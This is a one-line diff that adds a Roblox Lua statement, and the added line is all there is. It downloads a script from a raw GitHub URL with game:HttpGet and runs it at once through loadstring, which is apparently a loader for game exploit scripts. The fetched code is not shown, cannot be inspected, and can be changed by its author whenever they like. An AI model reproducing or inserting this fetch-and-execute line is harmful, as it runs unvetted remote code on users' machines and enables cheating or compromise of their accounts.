@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Piyushh198/Piyap/refs/heads/main/Nova"))()
